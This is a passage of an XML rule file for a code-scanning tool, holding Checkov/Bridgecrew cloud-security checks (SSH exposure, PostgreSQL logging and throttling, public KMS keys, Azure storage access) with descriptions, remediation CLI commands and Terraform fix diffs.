<p>TBD</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-public-api-gateway-are-protected-by-waf' target='_blank'> https://docs.bridgecrew.io/docs/ensure-public-api-gateway-are-protected-by-waf</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-public-api-gateway-are-protected-by-waf' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_DOCKER_1</key>
    <name>Ensure port 22 is not exposed</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="port-22-is-exposed"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-port-22-is-exposed"></div>Port 22 is exposed</div><a aria-label="Skip link to Port 22 is exposed" class="heading-anchor-icon fa fa-anchor" href="#port-22-is-exposed"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>By exposing port 22,  you may allow a bad actor to brute force their way into the system and potentially get access to the entire network. As a best practice, restrict SSH solely to known static IP addresses. Limit the access list to include known hosts, services, or specific employees only.<br/>
#Fix - Buildtime </p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">TBD
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-port-22-is-not-exposed' target='_blank'> https://docs.bridgecrew.io/docs/ensure-port-22-is-not-exposed</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-port-22-is-not-exposed' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_31</key>
    <name>Ensure Azure PostgreSQL database server with log connections parameter is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-postgresql-database-server-with-log-connections-parameter-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-postgre-sql-database-server-with-log-connections-parameter-is-disabled"></div>Azure PostgreSQL database server with log connections parameter is disabled</div><a aria-label="Skip link to Azure PostgreSQL database server with log connections parameter is disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-postgresql-database-server-with-log-connections-parameter-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling <strong>log_connections</strong> allows a PostgreSQL Database to log attempted connections to the<br/>
server in addition to logging the successful completion of client authentication. Log data can be used to identify, troubleshoot, repair configuration errors, and identify sub-optimal performance issues.</p>
<p>We recommend you set <strong>log_connections</strong> to <strong>On</strong> for PostgreSQL Server Databases.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>Azure Database</strong> for <strong>PostgreSQL server</strong>.</li>
<li>For each database:<br/>
a) Click <strong>Server</strong> parameters.<br/>
b) Navigate to <strong>log_connections</strong>.<br/>
c) Click <strong>On</strong>.<br/>
d) Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To update the <strong>log_connections</strong> configuration, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az postgres server configuration set 
--resource-group &lt;resourceGroupName&gt; 
--server-name &lt;serverName&gt; 
--name log_connections 
--value on
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform </div><a aria-label="Skip link to Terraform " class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_postgresql_configuration</li>
<li><strong>Argument</strong>: name + value</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">- resource "azurerm_postgresql_configuration" "example" {
-    name                = "log_connections"
-    resource_group_name = data.azurerm_resource_group.example.name
-    server_name         = azurerm_postgresql_server.example.name
-    value               = "off"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_networking_12' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_networking_12</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_networking_12' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_32</key>
    <name>Ensure Azure PostgreSQL database server with connection throttling parameter is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-postgresql-database-server-with-connection-throttling-parameter-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-postgre-sql-database-server-with-connection-throttling-parameter-is-disabled"></div>Azure PostgreSQL database server with connection throttling parameter is disabled</div><a aria-label="Skip link to Azure PostgreSQL database server with connection throttling parameter is disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-postgresql-database-server-with-connection-throttling-parameter-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling <strong>connection_throttling</strong> allows the PostgreSQL Database to set the verbosity of logged messages. It generates query and error logs with respect to concurrent connections that could lead to a successful Denial of Service (DoS) attack by exhausting connection resources. A system can also fail or be degraded by an overload of legitimate users. Query and error logs can be used to identify, troubleshoot, repair configuration errors, and address sub-optimal performance issues.</p>
<p>We recommend you set <strong>connection_throttling</strong> to <strong>On</strong> for PostgreSQL Server Databases.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>Azure Database</strong> for <strong>PostgreSQL server</strong>.</li>
<li>For each database:<br/>
a) Click <strong>Server</strong> parameters.<br/>
b) Navigate to <strong>connection_throttling</strong>.<br/>
c) Click <strong>On</strong>.<br/>
d) Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To update the <strong>connection_throttling configuration</strong>, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az postgres server configuration set 
--resource-group &lt;resourceGroupName&gt; 
--server-name &lt;serverName&gt; 
--name connection_throttling 
--value on
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_postgresql_configuration</li>
<li><strong>Arguments</strong>: name + value</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">- resource "azurerm_postgresql_configuration" "example" {
-    name                = "connection_throttling"
-    resource_group_name = data.azurerm_resource_group.example.name
-    server_name         = azurerm_postgresql_server.example.name
-    value               = "off"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_networking_13' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_networking_13</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_networking_13' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_GCP_6</key>
    <name>Ensure Cloud KMS cryptokeys are not anonymously or publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloud-kms-cryptokeys-are-anonymously-or-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-kms-cryptokeys-are-anonymously-or-publicly-accessible"></div>Cloud KMS cryptokeys are anonymously or publicly accessible</div><a aria-label="Skip link to Cloud KMS cryptokeys are anonymously or publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#cloud-kms-cryptokeys-are-anonymously-or-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>It is recommended that the IAM policy on Cloud KMS cryptokeys should restrict anonymous and/or public access.<br/>
Granting permissions to allUsers or allAuthenticatedUsers allows anyone to access the dataset. Such access might not be desirable if sensitive data is stored at the location. In this case, ensure that anonymous and/or public access to a Cloud KMS cryptokey is not allowed.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_kms_crypto_key</li>
<li><strong>Argument:</strong> google_kms_crypto_key_iam_member / google_kms_crypto_key_iam_binding</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_kms_key_ring" "keyring" {
  name = "keyring-example"
  location = "global"
}

resource "google_kms_crypto_key" "bad_key" {
  name = "crypto-key-example"
  key_ring = google_kms_key_ring.keyring.id
  rotation_period = "100000s"
  lifecycle {
    prevent_destroy = true
  }
}

resource "google_kms_crypto_key_iam_member" "bad_member_1" {
  crypto_key_id = google_kms_crypto_key.bad_key.id
  role          = "roles/cloudkms.cryptoKeyEncrypter"
- member        = "allUsers"
}

resource "google_kms_crypto_key_iam_member" "bad_member_2" {
  crypto_key_id = google_kms_crypto_key.bad_key.id
  role          = "roles/cloudkms.cryptoKeyEncrypter"
- member        = "allAuthenticatedUsers"
}

resource "google_kms_crypto_key_iam_binding" "bad_binding_1" {
  crypto_key_id = google_kms_crypto_key.bad_key.id
  role          = "roles/cloudkms.cryptoKeyEncrypter"
- members = [
-   "allUsers",
- ]
}

resource "google_kms_crypto_key_iam_binding" "bad_binding_2" {
  crypto_key_id = google_kms_crypto_key.bad_key.id
  role          = "roles/cloudkms.cryptoKeyEncrypter"
- members = [
-   "allAuthenticatedUsers",
- ]
}

resource "google_kms_crypto_key" "good_key" {
  name = "crypto-key-example"
  key_ring = google_kms_key_ring.keyring.id
  rotation_period = "100000s"
  lifecycle {
    prevent_destroy = true
  }
}

resource "google_kms_crypto_key_iam_member" "good_member" {
  crypto_key_id = google_kms_crypto_key.good_key.id
  role = "roles/cloudkms.cryptoKeyEncrypter"
+ member = "user:<a class="__cf_email__" data-cfemail="e18b808f84a18499808c918d84cf828e8c" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
}

resource "google_kms_crypto_key_iam_binding" "good_binding" {
  crypto_key_id = google_kms_crypto_key.good_key.id
  role          = "roles/cloudkms.cryptoKeyEncrypter"
+ members = [
+   "user:<a class="__cf_email__" data-cfemail="0a606b646f4a6f726b677a666f24696567" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>",
+ ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-cloud-kms-cryptokeys-are-not-anonymously-or-publicly-accessible' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-cloud-kms-cryptokeys-are-not-anonymously-or-publicly-accessible</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-cloud-kms-cryptokeys-are-not-anonymously-or-publicly-accessible' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_34</key>
    <name>Ensure public access level for  Blob Containers is set to private</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="public-access-level-for--blob-containers-is-not-set-to-private"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-public-access-level-for-blob-containers-is-not-set-to-private"></div>Public access level for  Blob Containers is not set to private</div><a aria-label="Skip link to Public access level for  Blob Containers is not set to private" class="heading-anchor-icon fa fa-anchor" href="#public-access-level-for--blob-containers-is-not-set-to-private"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Anonymous, public read access to a container and its blobs can be enabled in Azure Blob storage. It grants read-only access to these resources without sharing the account key or requiring a shared access signature. </p>
<p>We recommend you do not provide anonymous access to blob containers until, and unless, it is strongly desired. A shared access signature token should be used for providing controlled and timed access to blob containers.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To begin, follow Microsoft documentation and create shared access signature tokens for your blob containers. When complete, change the policy using the Azure Portal to deny anonymous access following these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>Storage Accounts</strong>.</li>
<li>For each storage account:<br/>
a) Navigate to <strong>BLOB SERVICE</strong>.<br/>
b) Select <strong>Containers</strong>.<br/>
c) For each <strong>Container</strong>:<br/>
(i) Click <strong>Access policy</strong>.<br/>
(ii) Set <strong>Public Access Level</strong> to<strong> Private</strong>. </li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set the permission for public access to private (off) for a specific blob container, use the container's name with the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az storage container set-permission 
--name &lt;containerName&gt; 
--public-access off 
--account-name &lt;accountName&gt; 
--account-key &lt;accountKey&gt;
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_storage_container</li>
<li><strong>Argument</strong>: container_access_type</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_storage_container" "example" {
    ...
+   container_access_type = "private"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/set-public-access-level-to-private-for-blob-containers' target='_blank'> https://docs.bridgecrew.io/docs/set-public-access-level-to-private-for-blob-containers</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/set-public-access-level-to-private-for-blob-containers' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_35</key>
    <name>Ensure Azure Storage Account default network access is set to Deny</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-storage-account-default-network-access-is-set-to-allow"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-storage-account-default-network-access-is-set-to-allow"></div>Azure Storage Account default network access is set to Allow</div><a aria-label="Skip link to Azure Storage Account default network access is set to Allow" class="heading-anchor-icon fa fa-anchor" href="#azure-storage-account-default-network-access-is-set-to-allow"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Restricting default network access helps to provide an additional layer of security. By default, storage accounts accept connections from clients on any network. To limit access to selected networks, the default action must be changed.</p>
<p>We recommend you configure storage accounts to <strong>deny</strong> access to traffic from all networks, including internet traffic. At an appropriate time, access can be granted to traffic from specific Azure Virtual networks, allowing a secure network boundary for specific applications to be built. Access can also be granted to public internet IP address ranges enabling connections from specific internet or on-premises clients. When network rules are configured only applications from allowed networks can access a storage account. When calling from an allowed network applications continue to require authorization, such as a valid access key or SAS token, to access the storage account.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>Storage Accounts</strong>.</li>
<li>For each storage account:<br/>
a) Navigate to <strong>Settings</strong> menu.<br/>
b) Click <strong>Firewalls and virtual networks</strong>.<br/>
c) For selected networks, select <strong>Allow access</strong>.<br/>
d) Add rules to allow traffic from specific network.<br/>
e) To apply changes,click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To update <strong>default-action</strong> to <strong>Deny</strong>, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az storage account update 
--name &lt;StorageAccountName&gt; 
--resource-group &lt;resourceGroupName&gt; 
--default-action Deny
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_storage_account_network_rules</li>
<li><strong>Argument</strong>: default_action</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_storage_account_network_rules" "test" {
    resource_group_name  = azurerm_resource_group.test.name
    storage_account_name = azurerm_storage_account.test.name

+   default_action             = "Deny"
}
</code></pre></div></div>
<p>In a Storage Account:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">azurerm_storage_account.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="azurerm_storage_account.test.tf">resource "azurerm_storage_account" "test" {
  name                = var.watcher
  resource_group_name = azurerm_resource_group.test.name
  location            = azurerm_resource_group.test.location

+  network_rules {
+    default_action="Deny"
+  }

  account_tier              = "Standard"
  account_kind              = "StorageV2"
  account_replication_type  = "LRS"
  enable_https_traffic_only = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/set-default-network-access-rule-for-storage-accounts-to-deny' target='_blank'> https://docs.bridgecrew.io/docs/set-default-network-access-rule-for-storage-accounts-to-deny</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/set-default-network-access-rule-for-storage-accounts-to-deny' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_36</key>
    <name>Ensure Azure Storage Account Trusted Microsoft Services access is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-storage-account-trusted-microsoft-services-access-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-storage-account-trusted-microsoft-services-access-is-not-enabled"></div>Azure Storage Account Trusted Microsoft Services access is not enabled</div><a aria-label="Skip link to Azure Storage Account Trusted Microsoft Services access is not enabled" class="heading-anchor-icon fa fa-anchor" href="#azure-storage-account-trusted-microsoft-services-access-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Some Microsoft services that interact with storage accounts operate from networks that cannot be granted access through network rules. To help this type of service work as intended, you can allow the set of trusted Microsoft services to bypass the network rules. These services will use strong authentication to access the storage account. Allowing trusted Microsoft services grants access to the storage account for the following services: Azure Backup, Azure Site Recovery, Azure DevTest Labs, Azure Event Grid, Azure Event Hubs, Azure Networking, Azure Monitor and Azure SQL Data Warehouse (when registered in the subscription).</p>
<p>Turning on firewall rules for a storage account will block access to incoming requests for data, including from other Azure services, such as using the portal and writing logs. Functionality can be re-enabled. The customer can get access to services like Monitor, Networking, Hubs, and Event Grid by enabling <strong>Trusted Microsoft Services</strong> through exceptions. Backup and Restore of Virtual Machines using unmanaged disks in storage accounts with network rules applied is supported by creating an exception.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>Storage Accounts</strong>.</li>
<li>For each storage account:<br/>
a) Navigate to <strong>Settings</strong> menu.<br/>
b) Click <strong>Firewalls and virtual networks</strong>.<br/>
c) For selected networks, select <strong>Allow access</strong>.<br/>
d) Select <strong>Allow trusted Microsoft services to access this storage account</strong>.<br/>
e) To apply changes,click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To update trusted Microsoft services, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az storage account update 
--name &lt;StorageAccountName&gt; 
--resource-group &lt;resourceGroupName&gt; 
--bypass AzureServices
</code></pre>
